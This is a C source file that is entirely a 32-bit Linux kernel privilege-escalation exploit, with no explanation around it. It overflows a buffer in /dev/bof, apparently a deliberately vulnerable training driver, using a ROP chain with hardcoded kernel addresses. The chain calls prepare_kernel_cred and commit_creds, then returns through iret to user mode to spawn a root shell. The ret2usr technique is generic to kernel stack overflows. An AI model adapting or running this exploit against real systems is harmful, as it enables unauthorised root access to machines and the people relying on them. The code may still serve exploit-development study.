```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdint.h>
#include <memory.h>

#define REG_PARAM(n) __attribute__((regparm(n)))	// EAX, EDX, and ECX
#define PACKED __attribute__((packed))

#define PL_SIZE (14+sizeof(trap_frame))

typedef struct PACKED trap_frame_s {
	void* eip ; // instruction pointer
	uint32_t cs ; // code segment
	uint32_t eflags ; // CPU flags
	uint32_t esp ; // stack pointer
	uint32_t ss ; // stack segment
} trap_frame;

trap_frame tf;

void* (*prepare_kernel_cred)(void*) REG_PARAM(1) = (void*) 0xc10711f0;
void* (*commit_creds)(void*) REG_PARAM(1) = (void*) 0xc1070e80;


void shell()
{
	execl("/bin/sh", "sh", NULL);
}

void prepare_tf(void) {
	asm ("pushl %cs; popl tf+4;"
	  	"pushfl; popl tf+8;"
		"pushl %esp; popl tf+12;"
		"pushl %ss; popl tf+16;");
	tf.eip = &shell;
	tf.esp -= 1024; // unused part of stack
}

int main(int ac, char** av)
{
	uint32_t rop[PL_SIZE];
	uint32_t offset = 40 / sizeof(uint32_t);

	memset(rop, 'A', sizeof(rop));
	rop[offset++] = 0xc14602ad;								// mov eax 0
	rop[offset++] = (uint32_t)(prepare_kernel_cred);
	rop[offset++] = (uint32_t)(commit_creds);
	rop[offset++] = (uint32_t)(0xc16e992d);					// iret

	prepare_tf();

	*(trap_frame*)(rop+(offset++)) = tf;

	int fd = open("/dev/bof", O_RDWR);
	write(fd, rop, sizeof(rop));

	close(fd);

	system("/bin/sh");
}
```